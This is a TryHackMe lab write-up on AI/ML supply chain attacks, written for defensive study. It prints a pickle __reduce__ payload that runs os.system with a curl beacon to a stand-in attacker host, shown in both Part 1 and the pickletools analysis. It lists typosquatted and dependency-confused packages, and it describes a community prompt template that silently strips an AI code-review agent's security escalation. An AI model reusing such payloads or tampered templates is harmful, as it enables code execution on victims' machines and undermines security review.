# ⚗️ TryHackMe: AI Supply Chain Attack Vectors Writeup

**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Tools Used:** pickletools, pip-audit, safe_analysis.py, Linux CLI  
**OWASP LLM Reference:** LLM03:2025 — Supply Chain Vulnerabilities  
**MITRE ATLAS:** AML.T0010 — ML Supply Chain Compromise

---

## Overview

Hands-on investigation of the TryTrainMe incident — a three-week supply chain compromise involving simultaneous pickle payload execution, dependency confusion, and fake repository manipulation. Investigated a malicious model file using `pickletools` without executing it, identified typosquatted and dependency-confused packages, traced the multi-vector attack timeline, and demonstrated a prompt template injection attack against an AI code review agent via a compromised community template library.

---

## Skills Demonstrated

- Safely disassembling malicious pickle files using `pickletools` without code execution
- Identifying critical opcodes (`STACK_GLOBAL`, `REDUCE`) and dangerous imports (`os`, `system`) in pickle bytecode
- Comparing clean vs. malicious model files to surface injection artifacts
- Detecting typosquatted packages and dependency confusion in `requirements.txt` files
- Tracing multi-vector supply chain attack chains (model + dependency + repository)
- Identifying API supply chain attack vectors: silent model updates, API key compromise, prompt template injection
- Demonstrating how a compromised community template library silently alters LLM behavior

---

## Part 1: Malicious Model Files — Pickle Serialisation

### How Pickle Exploitation Works

Python's pickle format uses a special method `__reduce__` to get reconstruction instructions when saving custom objects. When `pickle.load()` runs, Python executes those instructions **automatically, with no warnings**. An attacker replaces legitimate reconstruction instructions with system commands:

```python
class MaliciousModel:
    def __reduce__(self):
        # This executes when pickle.load() is called
        return (os.system, ("curl http://c2.example.com/beacon?host=$(hostname)",))
```

The victim calls `torch.load()` expecting model weights. `os.system()` executes a curl beacon to the attacker's server instead.

### Beyond Pickle: Architecture-Level Attacks (Keras Lambda Layers)

A second attack category hides malicious logic inside the model's **architecture** rather than its file format:

| Factor | Pickle `__reduce__` | Keras Lambda Layer |
|--------|--------------------|--------------------|
| Executes when | Model is **loaded** | Model makes a **prediction** |
| Survives SafeTensors conversion | ❌ No — eliminated | ✅ Yes — survives untouched |
| Severity | CRITICAL: arbitrary system commands | MEDIUM: arbitrary Python at inference time |

> **SafeTensors is not a universal fix.** It eliminates pickle-based attacks but leaves architecture-level attacks (Lambda layers baked into the model structure) completely untouched.

---

## Part 2: Investigating the Malicious Model

**Scenario:** TryTrainMe received a threat email: their AI code reviewer (`code_reviewer.pkl`) has been compromised for 3 weeks. Investigate safely.

### Step 1 — File Properties

```bash
ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl
```

```
-rwxr-xr-x  8.1M  code_reviewer.pkl      ← suspicious model
-rwxr-xr-x  2.0M  code_reviewer_v1.pkl   ← clean baseline
```

The suspicious model is **4x larger** than the clean version. Not proof of malice alone, but a notable signal warranting deeper inspection.

`file` command returns only `data` for both — cannot distinguish malicious from clean at this level.

### Step 2 — Safe Disassembly with pickletools

> ⚠️ **Never use `pickle.load()` on untrusted files.** It executes embedded code immediately.

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&1 | head -30
```

**Output:**
```
    0: \x80 PROTO      4
    2: \x95 FRAME      72
   11: \x8c SHORT_BINUNICODE 'os'
   16: \x8c SHORT_BINUNICODE 'system'
   25: \x93 STACK_GLOBAL
   27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
   80: R    REDUCE
   81: .    STOP
```

### Step 3 — Red Flag Analysis

| Line | Pattern | Why It's Suspicious |
|------|---------|---------------------|
| 11 | `SHORT_BINUNICODE 'os'` | `os` module not needed for ML inference |
| 16 | `SHORT_BINUNICODE 'system'` | `os.system` executes shell commands |
| 25 | `STACK_GLOBAL` | Resolves and prepares a Python function for execution |
| 27 | `curl http://attacker.com/...` | Outbound HTTP request to external attacker-controlled domain |
| 80 | `REDUCE` | **Executes** the function (`os.system`) with the provided argument |

**External domain the model contacts:** `attacker.com`

### Step 4 — Clean Model Comparison

```bash
python3 -m pickletools /opt/supply-chain/models/code_reviewer_v1.pkl 2>&1 | head -30
```

```
   11: \x8c SHORT_BINUNICODE '__main__'
   22: \x8c SHORT_BINUNICODE '_Room2_BenignModel'
   43: \x93 STACK_GLOBAL
   45: )    EMPTY_TUPLE
   46: \x81 NEWOBJ
```

Although both files use `STACK_GLOBAL`, the clean model references `__main__._Room2_BenignModel` — standard class reconstruction. No references to `os`, `system`, or external URLs. The remainder is data: dictionaries, lists, floats.

### Step 5 — safe_analysis.py Summary

```bash
python3 /opt/supply-chain/tools/safe_analysis.py /opt/supply-chain/models/code_reviewer.pkl
```

```
=== Pickle Safety Analysis ===
File: /opt/supply-chain/models/code_reviewer.pkl
Size: 8.4 MB

Dangerous opcodes found:
  [CRITICAL] STACK_GLOBAL: os.system
  [CRITICAL] REDUCE: executes os.system with arguments

Suspicious strings:
  [CRITICAL] 'curl http://attacker.com/beacon?host=$(hostname)'

Verdict: UNSAFE - Contains executable code targeting os.system
```

### Pickle Red Flag Reference

| Pattern | Concern Level | Legitimate in Model? |
|---------|--------------|---------------------|
| `os` | Critical | Almost never |
| `system`, `popen` | Critical | Never |
| `subprocess` | Critical | Never |
| `socket` | Critical | Never |
| `eval`, `exec` | Critical | Never |
| `curl`, `wget` | Critical | Never |
| `STACK_GLOBAL` | Moderate | Common — check what it resolves |
| `REDUCE` | Moderate | Common — check context |

---

## Part 3: Dependency Confusion & Typosquatting

### How Dependency Confusion Works

When `pip install` runs, it queries all configured indices and installs the **highest version found**. Organisations that use internal packages configure `--extra-index-url` pointing pip at a private registry alongside public PyPI.

**The attack:** If an internal package name is not registered on public PyPI, an attacker registers it there with version `99.0.0`. Pip installs the attacker's public package over the internal one — following the higher version number.

**Alex Birsan (2021):** Demonstrated this against Apple, Microsoft, and PayPal by registering exposed internal package names on PyPI, npm, and RubyGems. Achieved code execution across all three. Earned $130,000+ in bug bounties.

### Hands-On: Suspicious Requirements File

```bash
cat /opt/supply-chain/dependencies/requirements_external.txt
```

```
torch==2.1.0
transformers==4.35.0
numppy==1.24.0          ← typosquatted: should be numpy
reqeusts==2.31.0        ← typosquatted: should be requests
safetensors==0.4.0
accelerate==0.24.0
internal-ml-utils==99.0.0  ← dependency confusion: unusually high version
```

| Package | Issue |
|---------|-------|
| `numppy` | Typosquatted — extra 'p' |
| `reqeusts` | Typosquatted — swapped 'ue' |
| `internal-ml-utils==99.0.0` | Dependency confusion — `99.0.0` signals attacker-controlled PyPI package overriding internal version |

```bash
pip-audit -r /opt/supply-chain/dependencies/requirements_external.txt
```
```
ERROR: Could not find a version that satisfies the requirement numppy==1.24.0
```
pip-audit fails here because `numppy` is not yet registered on PyPI. In a real attack, the attacker registers it first — pip installs succeed silently with no error.

### Typosquatting Reference

| Legitimate | Typosquatted | Difference |
|-----------|-------------|------------|
| numpy | numppy | Extra 'p' |
| requests | reqeusts | Swapped 'ue' |
| scikit-learn | scikitlearn | Missing hyphen |
| tensorflow | tenserflow | 'ser' instead of 'sor' |

---

## Part 4: Model Repository Attacks

### Fake Organisation Red Flags

The `trustworthy-ai-lab` organisation used in the TryTrainMe attack is a textbook example:
- No verification badge
- Joined January 2025 (brand new)
- Only 1 model uploaded
- 127 downloads last month

### Repository Warning Signs

| Signal | Safe | Suspicious |
|--------|------|-----------|
| Download count | Thousands to millions | Under 500 |
| Organisation | Verified badge, known name | No badge, generic-sounding name |
| Model card | Architecture, training data, metrics, limitations | Missing, sparse, or copy-pasted |
| Upload date | Consistent with claimed training timeline | Very recent for supposedly established model |
| File formats | SafeTensors available | Pickle only, no safe alternatives |

### Compromised Legitimate Repositories

More dangerous than fake organisations: **stolen credentials on trusted repos**. The Lasso Security research (Nov 2023) found 1,500+ exposed Hugging Face API tokens in public repositories — 655 with write permissions to major organisations including Google, Meta, and Microsoft.

> An attacker with a write-permission token pushes malicious model updates **under a trusted identity** — no fake account, no suspicious namespace, no tooling flag at download time.

---

## Part 5: When Attack Vectors Combine

The TryTrainMe attack deployed three vectors simultaneously for redundancy:

| Vector | Mechanism | Role in Attack |
|--------|-----------|---------------|
| **Pickle payload** | `__reduce__` calling `os.system` | Primary entry — executes on model load |
| **Dependency confusion** | `internal-ml-utils==99.0.0` on PyPI | Backup entry — executes on `pip install` |
| **Repository manipulation** | Fake `trustworthy-ai-lab` org | Trust mechanism — makes the download feel safe |

### Attack Timeline

| Week | Event |
|------|-------|
| Week 1 | Attacker registers `trustworthy-ai-lab` on Hugging Face, uploads backdoored pickle model. Simultaneously publishes `internal-ml-utils==99.0.0` to PyPI |
| Week 2 | TryTrainMe engineer downloads model. `pickle.load()` fires silently; C2 beacon connects to `attacker.com` |
| Week 3 | Routine `pip install -r requirements.txt` pulls the attacker's PyPI package. Second independent foothold established |
| Detection | SOC automated alert flags repeated outbound HTTPS to unrecognised domain. CEO receives email |

> **The key defensive insight:** Each vector covered a different failure mode. If the model loader blocked pickle execution, the dependency package was already installed. Defending against one vector is not enough — layered defences across all attack surfaces are required.

---

## Part 6: API Provider Attack Vectors

When consuming AI via API, the file-level attack surface doesn't exist — but a different set of vectors does:

### Silent Model Updates

Provider can replace the model behind an endpoint without notice. The endpoint URL stays the same; behaviour changes silently.

**TryTrainMe risk:** A silent update changing how the code reviewer classifies security findings could deploy vulnerable code to production with no alert and no visible change in logs.

**Defence:** Version-pin where provider supports it. Log model version identifiers from every API response. Baseline behaviour on a fixed test set and alert on output drift.

### API Key Compromise

API keys exposed through source code, CI/CD logs, or environment files give attackers the ability to make calls on your behalf, exfiltrate all data sent to the API, or exhaust billing.

**TryTrainMe risk:** LLM API key stored in an unencrypted environment variable. Pipeline log leak exposes every code review request ever sent plus the key to send more.

**Defence:** Store API keys in a secrets manager. Rotate on any suspected exposure. Set per-key spending alerts and rate limits.

### Prompt Template Injection

System prompts sourced from shared repositories are supply chain artefacts — they come from an external source and control how the model behaves. A compromised template library can alter application behaviour across every application that imports from it.

**Lab demonstration:** TryAssist's review policy was sourced from a community template library (`CommunityReview`). After a routine library update, the agent's behaviour changed silently:

- **Prompt 1 (baseline):** PR #301 (README update) → Approved correctly
- **Prompt 2 (failure):** PR #447 (authentication token validation) → Approved without escalation ⚠️
- **Prompt 3 (process check):** "Before approving security-critical code, what steps do you take?" → Responsibility shifted to **development team**; security review process removed
- **Prompt 4 (source trace):** Policy named as `CommunityReview` — sourced from community template library

**No model file was downloaded. No version was bumped in requirements.txt. A single text string, served remotely and trusted implicitly, silently removed the security escalation policy.**

**Defence:** Treat system prompts as code. Version-control them in your own repository. Never auto-update prompts from external sources without review.

### Upstream Training Data Poisoning

No visibility into provider training pipelines. If training data contained adversarial examples, the model may produce systematically biased outputs — with no file to scan and no static analysis possible.

**Defence:** Red-team model outputs regularly against known-bad inputs. Maintain human review for high-stakes decisions. Treat model behaviour as a managed risk, not a guarantee.

---

## Attack Vector Summary

| Vector | Mechanism | Detection Difficulty | Impact |
|--------|-----------|---------------------|--------|
| Pickle `__reduce__` | Embeds code in model file | Moderate — pickletools reveals it | Code execution on model load |
| Keras Lambda layer | Embeds code in model architecture | Moderate — architecture inspection needed | Code execution at inference time |
| Dependency confusion | Hijacks internal package names via higher version | Low — version anomalies visible | Code execution on pip install |
| Typosquatting | Misspelt package names | Low — name comparison reveals | Code execution on pip install |
| Repository manipulation | Fake orgs, professional model cards | Moderate — reputation signals | Trusted distribution of malicious models |
| API silent model update | Provider swaps model behind endpoint | High — no file artefact | Invisible behavior change |
| API key compromise | Credentials exposed in source/logs | High — no on-system artifact | Data exfiltration, billing abuse |
| Prompt template injection | Compromised community template alters policy | High — text string, no version bump | Silent behavior modification |
| GGUF weight-level backdoor | Fine-tuned before quantisation | Very High — no static analysis tools | Triggered misclassification |

---

## Key Takeaways

- **`pickletools` is the safe inspection path** — never call `pickle.load()` on untrusted files; use `pickletools` to disassemble bytecode without executing it
- **STACK_GLOBAL + REDUCE + os.system = critical finding** — this combination in pickle bytecode is a confirmed code execution payload
- **SafeTensors eliminates serialisation-level attacks only** — Keras Lambda layers baked into the architecture survive format conversion entirely
- **Version 99.0.0 on a public package is a dependency confusion signal** — internal package names that appear on PyPI with unusually high versions warrant immediate investigation
- **Multi-vector attacks stack for redundancy** — real supply chain campaigns combine pickle payloads, dependency confusion, and fake repositories so that blocking one vector doesn't stop the others
- **Prompt templates are supply chain artefacts** — a text string sourced from an external library and trusted implicitly can silently remove security policies from an AI agent with no file change, no version bump, and no alert

---

*Part of an ongoing TryHackMe SOC Analyst learning path | Tools: pickletools, pip-audit | Frameworks: OWASP LLM Top 10 (LLM03:2025), MITRE ATLAS AML.T0010 | Focus: AI/ML Supply Chain Security*
